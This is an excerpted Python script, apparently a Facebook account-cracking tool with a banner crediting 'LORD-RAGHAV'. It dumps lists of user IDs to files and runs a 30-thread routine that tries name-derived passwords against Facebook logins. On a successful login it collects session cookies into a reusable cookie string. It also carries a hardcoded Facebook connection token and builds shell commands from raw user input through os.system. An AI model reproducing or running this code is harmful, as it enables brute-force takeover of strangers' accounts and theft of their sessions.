...
from concurrent.futures import ThreadPoolExecutor as RAGHAVRAGHAV
from string import * 
...
\033[1;37m    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            LORD-RAGHAV
\033[1;37m Facebook:            RAGHAV N THAPA 
\033[1;37m Github  :            RAGHAV-JOD
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back RAGHAV Menu ")
        exit()
...
def RAGHAV():   
    ...
    print(f'[W] FACEBOOK ID ')
    print(f'[F] INSTAGRAM ID ')
    print('')
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://www.instagram.com/i.am.a.looser.007?igshid=OGQ5ZDc2ODk2ZA==')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        RAGHAV(allkey)
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RAGHAVb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RAGHAVb};{ckkk}"
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with RAGHAVRAGHAV(max_workers=30) as RAGHAVworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                ...
                                RAGHAVworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                RAGHAVworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/RAGHAV.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/RAGHAV.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    RAGHAV = input('Put File Name :')
    print(" ")
    RAGHAV = input('Saving Put File Name :')
    os.system('touch ' +RAGHAV)
    os.system('sort -r '+RAGHAV+' | uniq > '+RAGHAV)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + RAGHAV )
    print(47*'-')
    print("File Saved To :" + RAGHAV )
    print(47*'-')
    input(f"{S} Press Enter To Back RAGHAV Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/RAGHAV.txt\n') 
        filepath = input("Put File Name: ")
